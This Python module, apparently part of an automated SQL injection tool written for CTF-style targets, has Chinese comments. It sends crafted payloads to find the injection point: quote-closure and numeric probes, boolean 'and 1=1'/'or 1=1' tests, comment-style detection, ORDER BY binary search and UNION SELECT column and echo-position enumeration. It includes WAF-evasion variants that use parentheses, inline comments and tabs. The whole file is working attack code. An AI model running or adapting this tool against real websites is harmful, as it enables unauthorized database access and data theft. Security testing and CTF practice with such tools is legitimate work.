"""注入点发现：闭合类型、注释符、数字型判定、列数与回显位。

多形态探针（classic/paren/inline/tab）：空格被 WAF 过滤时自动切换
括号法等无空格形式（ctfshow 类 "and 可用但带空格即拦" 的环境）。
"""
from __future__ import annotations

from typing import List, Optional

from .models import InjectionPoint, ResponseInfo, similarity
from .session import HttpSession
from ..tampers import apply_form

MARKER_PREFIX = "asq"          # 回显位标记前缀，尽量避开常见词

# (形态名, 恒真核心, 恒假核心)——and 适用查询框，or 适用登录框（恒真=登录成功）
BOOL_FORMS = [
    ("classic", " and 1=1", " and 1=2"),
    ("paren",   "and(1=1)", "and(1=2)"),
    ("classic", " or 1=1", " or 1=2"),
    ("paren",   "or(1=1)", "or(1=2)"),
    ("inline",  "/**/and/**/1=1", "/**/and/**/1=2"),
    ("inline",  "/**/or/**/1=1", "/**/or/**/1=2"),
    ("tab",     "\tand\t1=1", "\tand\t1=2"),
    ("tab",     "\tor\t1=1", "\tor\t1=2"),
]


class Detector:
    def __init__(self, session: HttpSession):
        self.s = session
        self.log = session.log
        self.R_base: Optional[ResponseInfo] = None
        self.R_err: Optional[ResponseInfo] = None
        self.form = "classic"

    # ------------------------------------------------------------------ utils
    def _send(self, value: str) -> ResponseInfo:
        return self.s.request_value(value)

    def _same_as_base(self, r: ResponseInfo, threshold: float = 0.98) -> bool:
        return similarity(r, self.R_base) >= threshold and r.status_code == self.R_base.status_code

    # ------------------------------------------------------------------ main
    def analyze(self) -> Optional[InjectionPoint]:
        spec = self.s.spec
        self.R_base = self._send(spec.base_value)
        if self.R_base.status_code < 0:
            self.log("ERROR", "基线请求失败，请检查目标 URL / 登录配置")
            return None
        self.log("INFO", f"基线响应: {self.R_base.status_code}, {self.R_base.length}B")

        inj = InjectionPoint(param=spec.param, base_value=spec.base_value)
        # 数字型优先（medium 类转义环境下引号闭合会造成误判）
        if self._probe_numeric():
            inj.closure = ""
            inj.numeric = True
        else:
            closure = self._probe_closure()
            if closure is not None:
                inj.closure = closure
                inj.numeric = False
            else:
                self.log("WARN", "未发现明显注入点（闭合探测无 SQL 报错，数字型布尔无差异）")
                return None
        inj.form = self.form

        comment = self._probe_comment(inj)
        inj.comment = comment
        self._probe_bool(inj)
        self._probe_columns(inj)
        return inj

    # ------------------------------------------------------------------ closure
    def _probe_closure(self) -> Optional[str]:
        """逐一试探引号类闭合：
        1) 报错法：suffix 引发 SQL 报错即命中；
        2) 布尔法（LIMIT 拼接等环境下 1' 合法不报错）：
           1{suffix} and 1=1# 与 1=2 页面有差异即命中。"""
        for suffix in ("'", '"', "')", '")', "`"):
            r = self._send(self.s.spec.base_value + suffix)
            if r.has_sql_error():
                self.R_err = r
                self.log("INFO", f"命中闭合: {suffix!r}（SQL 报错回显）")
                return suffix
            if r.has_waf_block():
                self.log("WARN", f"探测 {suffix!r} 时疑似被 WAF 拦截")
        # 保存一个"无报错"参照（供 WAF 扫描使用）
        self.R_err = self._send(self.s.spec.base_value + "'")

        # 布尔确认兜底（多形态：空格被滤时 classic 全灭，需试括号/tab/内联；
        # 登录框语义下 and 不产生差异，or 恒真=登录成功页）
        for suffix in ("'", "')"):
            for form, t_core, f_core in BOOL_FORMS:
                t = self._send(f"{self.s.spec.base_value}{suffix}{t_core}#")
                f = self._send(f"{self.s.spec.base_value}{suffix}{f_core}#")
                if t.status_code < 0 or f.status_code < 0:
                    continue
                # 判定：真假页有差异，且其中一方回归基线（and:真=基线；or:假=基线）
                if self._differs(t, f) and \
                        (self._same_as_base(t, 0.98) or self._same_as_base(f, 0.98)):
                    self.log("INFO", f"命中闭合: {suffix!r}（布尔差异确认，形态={form}，"
                                     f"核心={t_core.strip()[:12]}）")
                    self.form = form
                    return suffix
        return None

    def _probe_numeric(self) -> bool:
        """数字型判定：and 1=1 / and 1=2 页面差异。"""
        t = self._send(f"{self.s.spec.base_value} and 1=1")
        f = self._send(f"{self.s.spec.base_value} and 1=2")
        if t.status_code < 0 or f.status_code < 0:
            return False
        if not self._differs(t, f):
            return False
        if self._same_as_base(t, 0.9):
            self.log("INFO", "数字型注入确认（and 1=1 与 and 1=2 存在差异）")
            return True
        return False

    @staticmethod
    def _differs(a: ResponseInfo, b: ResponseInfo) -> bool:
        return similarity(a, b) < 0.995 or a.status_code != b.status_code

    # ------------------------------------------------------------------ comment
    def _probe_comment(self, inj: InjectionPoint) -> str:
        """探测尾部处理方式，返回最优 comment（含 quote-close）。
        探针按已命中的 form 变换（空格被滤时自动无空格化）。"""
        base = inj.base_value
        pre = base if inj.numeric else base + inj.closure
        forms = [("", " and 1=1")]
        if inj.form != "classic":
            forms = [(inj.form, " and 1=1")]
        candidates = [
            ("#",        " and 1=1#"),
            ("-- ",      " and 1=1-- "),
            ("quote-close", None),
        ]
        for name, core in candidates:
            for form, _ in forms:
                if name == "quote-close":
                    if inj.numeric:
                        continue
                    payload = apply_form(" and '1'='1", form)
                    payload = f"{pre}{payload}"
                else:
                    payload = f"{pre}{apply_form(core, form)}"
                t = self._send(payload)
                f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
                if t.status_code < 0 or f.status_code < 0:
                    continue
                if self._same_as_base(t, 0.9) and self._differs(t, f):
                    self.log("INFO", f"注释/收尾方式可用: {name!r}")
                    return name
        # or 变体再试（and 可能被过滤）
        if not inj.numeric:
            for name in ("#", "quote-close"):
                core_or = " or 1=1#" if name == "#" else " or '1'='1"
                for form, _ in forms:
                    payload = f"{pre}{apply_form(core_or, form)}"
                    t = self._send(payload)
                    f = self._send(payload.replace("1=1", "1=2").replace("'1'='1", "'1'='2"))
                    if t.status_code > 0 and not self._same_as_base(t, 0.95) \
                            and self._differs(t, f):
                        self.log("INFO", f"注释/收尾方式可用(and被滤，or验证): {name!r}")
                        return name
        self.log("WARN", "未找到可用注释符，默认使用 #（可能需要手工调整）")
        return "#"

    def _probe_bool(self, inj: InjectionPoint):
        """记录布尔差异标记，供盲注使用。"""
        pre = inj.base_value if inj.numeric else inj.base_value + inj.closure
        tail = inj.comment if inj.comment != "quote-close" else ""
        t = self._send(f"{pre}{apply_form(' and 1=1', inj.form)}{tail}")
        f = self._send(f"{pre}{apply_form(' and 1=2', inj.form)}{tail}")
        inj.bool_markers = {"true_len": t.length, "false_len": f.length,
                            "true_status": t.status_code, "false_status": f.status_code}

    # ------------------------------------------------------------------ union
    def _probe_columns(self, inj: InjectionPoint):
        """列数 + 回显位。
        classic：ORDER BY 二分（成功/失败双参照最近邻，兼容空报错页）；
        paren/tab/inline：UNION 列数枚举法（逐列 marker，命中即得列数与回显位）。"""
        if inj.form == "classic":
            self._columns_by_orderby(inj)
        if inj.column_count:
            return
        self._columns_by_union_enum(inj)

    def _columns_by_orderby(self, inj: InjectionPoint):
        pre = f"{inj.base_value}{inj.closure}"
        r_ok = self._send(f"{pre} order by 1{inj.comment}")
        r_bad = self._send(f"{pre} order by 999{inj.comment}")
        if r_ok.status_code < 0 or similarity(r_ok, r_bad) > 0.99:
            return          # 页面对 order by 成败无区分度
        is_err = lambda r: similarity(r, r_bad) >= similarity(r, r_ok)

        lo, hi, good = 1, 40, 0
        while lo <= hi:
            mid = (lo + hi) // 2
            r = self._send(f"{pre} order by {mid}{inj.comment}")
            if r.status_code > 0 and not is_err(r) and not r.has_waf_block():
                good, lo = mid, mid + 1
            else:
                hi = mid - 1
        if good == 0:
            return
        inj.column_count = good
        self.log("INFO", f"ORDER BY 探测列数: {good}")
        self._find_echo_positions(inj)

    def _columns_by_union_enum(self, inj: InjectionPoint):
        """UNION 列数枚举：n=1..15，每列放独立 marker，页面出现即命中。"""
        pre = f"0{inj.closure}" if not inj.numeric else "0"
        for n in range(1, 16):
            if self.s.stopped:
                return
            markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(n)]
            cols = ",".join(f"'{m}'" for m in markers)
            payload = f"{pre}{apply_form(f'union select {cols}', inj.form)}{inj.comment}"
            r = self._send(payload)
            if r.status_code > 0:
                pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
                if pos:
                    inj.column_count = n
                    inj.echo_positions = pos
                    self.log("INFO", f"UNION 枚举列数: {n}，回显位: 第 {pos} 列")
                    return

    def _find_echo_positions(self, inj: InjectionPoint):
        markers = [f"{MARKER_PREFIX}{i:02d}x7" for i in range(inj.column_count)]
        cols = ",".join(f"'{m}'" for m in markers)
        r = self._send(f"0{inj.closure} union select {cols}{inj.comment}")
        if r.status_code > 0:
            pos = [i + 1 for i, m in enumerate(markers) if m in r.body]
            if pos:
                inj.echo_positions = pos
                self.log("INFO", f"回显位: 第 {pos} 列")
